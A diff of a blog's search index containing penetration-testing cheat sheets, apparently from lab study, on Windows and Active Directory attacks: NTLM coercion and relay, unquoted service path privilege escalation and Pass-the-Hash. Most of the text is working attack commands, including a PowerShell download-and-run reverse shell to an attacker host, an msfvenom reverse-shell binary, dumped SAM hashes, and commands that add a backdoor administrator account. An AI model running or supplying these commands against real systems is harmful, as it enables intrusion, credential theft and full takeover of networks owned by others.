+<h5 id="PetitPotam-MS-EFSR"><a href="#PetitPotam-MS-EFSR" class="headerlink" title="PetitPotam (MS-EFSR)"></a>PetitPotam (MS-EFSR)</h5><blockquote>
+<p>➜ if the system is not patched for CVE-2021-36942 we don’t need credentials</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_ip&gt; &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="DFSCoerce-MS-DFSNM"><a href="#DFSCoerce-MS-DFSNM" class="headerlink" title="DFSCoerce (MS-DFSNM)"></a>DFSCoerce (MS-DFSNM)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dfscoerce.py -u &lt;user&gt; -p &lt;password&gt; &lt;attacker_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Coercer-automated-all-three-above"><a href="#Coercer-automated-all-three-above" class="headerlink" title="Coercer (automated, all three above)"></a>Coercer (automated, all three above)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Coercer coerce -t &lt;target_ip&gt; -l &lt;attacker_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -v --always-continue</span><br></pre></td></tr></table></figure>
+
+<h5 id="NetExec-coerce-plus"><a href="#NetExec-coerce-plus" class="headerlink" title="NetExec coerce_plus"></a>NetExec coerce_plus</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M coerce_plus -o LISTENER=&lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Coerce-Method-Coerce-User-Account"><a href="#Coerce-Method-Coerce-User-Account" class="headerlink" title="Coerce Method  : Coerce User Account"></a>Coerce Method  : Coerce User Account</h3><blockquote>
+<p>➜ We need only <code>Write access</code> to a shared folder </p>
+</blockquote>
+<h5 id="ntlm-theft"><a href="#ntlm-theft" class="headerlink" title="ntlm_theft"></a>ntlm_theft</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s &lt;attacker_ip&gt; -f &lt;payload_name&gt;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //&lt;target_ip&gt;/&lt;share&gt; -U &lt;user&gt;</span><br><span class="line"></span><br><span class="line">smb: \&gt; put &lt;payload_name&gt;.lnk</span><br></pre></td></tr></table></figure>
+
+<h5 id="Slinky-nxc-module"><a href="#Slinky-nxc-module" class="headerlink" title="Slinky ( nxc module)"></a>Slinky ( nxc module)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M slinky -o SERVER=&lt;attacker_ip&gt; NAME=&lt;lure_name&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="MSSQL-UNC-path-coercion"><a href="#MSSQL-UNC-path-coercion" class="headerlink" title="MSSQL UNC path coercion"></a>MSSQL UNC path coercion</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mssqlclient.py <span class="string">&#x27;inlanefreight/plaintext$:PASS@&lt;target_ip&gt;&#x27;</span> -windows-auth</span><br><span class="line"></span><br><span class="line">SQL (plaintext$ guest@master)&gt; xp_dirtree \\&lt;attacker_ip&gt;\test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="LLMNR-NBT-NS-mDNS-poisoning"><a href="#LLMNR-NBT-NS-mDNS-poisoning" class="headerlink" title="LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning"></a>LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning</h5><blockquote>
+<p>Unlike the other coerce methods we can’t choose who gets coerced, we wait for any user to  mistype a hostname then responder answer the request</p>
+</blockquote>
+<blockquote>
+<p>➜ Disable Responder’s SMB and HTTP servers (so <code>ntlmrelayx</code> can use them):</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/SMB = On/SMB = Off/&quot;</span> Responder.conf</span><br><span class="line">sed -i <span class="string">&quot;s/HTTP = On/HTTP = Off/&quot;</span> Responder.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Start Responder to poison name-resolution broadcasts:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 Responder.py -I &lt;interface&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Relay-Post-Exploitation"><a href="#Relay-Post-Exploitation" class="headerlink" title="Relay &amp; Post-Exploitation"></a>Relay &amp; Post-Exploitation</h3><blockquote>
+<p>Regardless of which coercion method above was used, the captured SMB authentication is relayed with the same way</p>
+</blockquote>
+<blockquote>
+<p>Single target</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t smb://&lt;hostname&gt;.&lt;domain&gt; -smb2support</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Multiple Machines </p>
+</blockquote>
+<blockquote>
+<p>We need to update <code>relayTargets.txt </code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smb://IP</span><br><span class="line">smb://hostname.domain.local</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Then</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Normal-User"><a href="#Normal-User" class="headerlink" title="Normal User"></a>Normal User</h5><blockquote>
+<p>If the relayed account is a normal user (non-admin), we can’t SAM dump or RCE , we can only use <code>-i</code> for an interactive SMB session and access shares that the relayed user can read and write.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -i</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nv 127.0.0.1 11000</span><br><span class="line"></span><br><span class="line"><span class="comment"># shares</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Admin-User"><a href="#Admin-User" class="headerlink" title="Admin User"></a>Admin User</h5><blockquote>
+<p>If the relayed account is a local <code>admin user</code> on the machine that we relayed to, <code>ntlmrelayx</code> will automatically <code>dump SAM</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Authenticating against smb://&lt;target_ip&gt; as &lt;DOMAIN&gt;/&lt;USER&gt; SUCCEED</span><br><span class="line">[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Command execution &#x2F; reverse shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -c</span><br><span class="line"><span class="string">&quot;powershell -c IEX(New-Object NET.WebClient).DownloadString(&#x27;http://&lt;attacker_ip&gt;:Port/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;attacker_ip&gt; -Port Port&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h5 id="Socks"><a href="#Socks" class="headerlink" title="Socks"></a>Socks</h5><blockquote>
+<p>If we want the relayed session to keep alive we can use <code>-socks</code> flag with <code>ntlmrelayx</code> </p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support -socks</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Then we can use any tool with <code>proxychains</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 -q smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -no-pass</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>NTLM Relay</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+        <tag>PetitPotam</tag>
+        <tag>DFSCoerce</tag>
+        <tag>Responder</tag>
       </tags>
   </entry>
   <entry>
@@ -2419,6 +2359,101 @@
       </tags>
   </entry>
   <entry>
+    <title>Unquoted Service Path</title>
+    <url>/2026/06/16/Unquoted-Service-Path/</url>
+    <content><![CDATA[<p> &gt;➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM.<br> &gt;<br> &gt;➜ Example :<br> &gt;<br> &gt;➜ If the service binary path is :</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure>
+
+<p> &gt;➜ Windows will attempt to execute the following paths in order :<br> &gt;<br> &gt; - <code>C:\Program.exe</code><br> &gt; - <code>C:\Program Files.exe</code><br> &gt; - <code>C:\Program Files (x86)\System.exe</code><br> &gt; - <code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Unquoted-Service-Paths"><a href="#Enumerate-Unquoted-Service-Paths" class="headerlink" title="Enumerate Unquoted Service Paths"></a>Enumerate Unquoted Service Paths</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">htb</span>-<span class="title">student</span>&gt;<span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">startname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;\&quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>          <span class="title">GVFS.Service</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                  <span class="title">Auto</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>   <span class="title">SystemExplorerHelpService</span>  <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>      </span></span><br><span class="line"><span class="function"><span class="title">Auto</span></span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service |</span><br><span class="line"><span class="built_in">Where-Object</span> &#123;</span><br><span class="line">    <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;C:\Windows*&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-match</span> <span class="string">&#x27; &#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notmatch</span> <span class="string">&#x27;^&quot;&#x27;</span></span><br><span class="line">&#125; |</span><br><span class="line"><span class="built_in">Select</span> Name, DisplayName, StartName, PathName</span><br><span class="line"></span><br><span class="line">GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto</span><br><span class="line"></span><br><span class="line">System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe      </span><br><span class="line">Auto</span><br></pre></td></tr></table></figure>
+
+
+<p> &gt;➜ As we can see, these two services have unquoted service paths and may be vulnerable to privilege escalation if writable directories are present.</p>
+<h4 id="Checking-Directory-Permissions"><a href="#Checking-Directory-Permissions" class="headerlink" title="Checking Directory Permissions"></a>Checking Directory Permissions</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer\service\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>➜ We have write permission on <code>C:\Program Files (x86)\</code>, allowing us to place a malicious executable in this directory.</p>
+</blockquote>
+<h1 id="Exploiting-the-Unquoted-Service-Path"><a href="#Exploiting-the-Unquoted-Service-Path" class="headerlink" title="Exploiting the Unquoted Service Path"></a>Exploiting the Unquoted Service Path</h1><blockquote>
+<p>Create malicious binary</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions msfvenom -p windows/shell_reverse_tcp LHOST=Our-IP LPORT=Listening-Port -f exe &gt; System.exe</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Transfer binary to target</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://Our<span class="literal">-IP</span>:port/System.exe <span class="literal">-O</span> <span class="string">&quot;C:\Program Files (x86)\System.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Restart the service</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe <span class="built_in">start</span> SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Get Reverse Shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+      </categories>
+      <tags>
+        <tag>wmic</tag>
+        <tag>icacls</tag>
+        <tag>msfvenom</tag>
+        <tag>Windows-Services</tag>
+        <tag>Unquoted-Service-Path</tag>
+        <tag>Service-Hijacking</tag>
+        <tag>Weak-Permissions</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
+<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
+<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows Pass the Ticket (PtT)</title>
     <url>/2025/11/27/Windows-Pass-the-Ticket-PtT/</url>
     <content><![CDATA[<h1 id="Harvesting-Kerberos-tickets"><a href="#Harvesting-Kerberos-tickets" class="headerlink" title="Harvesting Kerberos tickets"></a>Harvesting Kerberos tickets</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
@@ -2541,35 +2576,6 @@
         <tag>CeWL</tag>
         <tag>Cupp</tag>
         <tag>Hashcat Rules</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Windows-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="Mimikatz-local-administrator-privilege"><a href="#Mimikatz-local-administrator-privilege" class="headerlink" title="Mimikatz ( local administrator privilege  )"></a>Mimikatz ( local administrator privilege  )</h1><p>➜ This command will create a new CMD session using the permissions of the user we want to impersonate.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:username /NTLM:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>➜ When impersonating a local account, the <code>/domain</code> parameter should be set to <code>localhost</code> or simply <code>.</code></p>
-<h1 id="PowerShell-Invoke-TheHash"><a href="#PowerShell-Invoke-TheHash" class="headerlink" title="PowerShell Invoke-TheHash"></a>PowerShell Invoke-TheHash</h1><p>➜ Since <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a> uses <code>Invoke-SMBExec</code> and <code>Invoke-WMIExec</code> to authenticate and execute commands on the target, the NTLM hash used must belong to an <code>account with administrative rights</code> on the target.</p>
-<h4 id="Invoke-TheHash-with-SMB"><a href="#Invoke-TheHash-with-SMB" class="headerlink" title="Invoke-TheHash with SMB"></a>Invoke-TheHash with SMB</h4><p>➜ This command creates a new local user account and adds it to the <code>local Administrators group</code> on the target machine.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-TheHash</span>.psd1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> c:\tools\<span class="built_in">Invoke-TheHash</span>&gt; <span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> &lt;tar<span class="built_in">get-ip</span>&gt; <span class="literal">-Domain</span> &lt;domain&gt; <span class="literal">-Username</span> &lt;username&gt; <span class="literal">-Hash</span> &lt;hash&gt; <span class="literal">-Command</span> <span class="string">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Invoke-TheHash-with-WMI"><a href="#Invoke-TheHash-with-WMI" class="headerlink" title="Invoke-TheHash with WMI"></a>Invoke-TheHash with WMI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\tools&gt; .\nc.exe -lvnp &lt;Port&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1</span><br><span class="line"></span><br><span class="line">PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target target -Domain domain -Username username -Hash hash -Command &quot;powershell -e JABjAGwAaQBlAG4Ad &lt;snip&gt; AGwAbwBzAGUAKAApAA==&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
 </search>
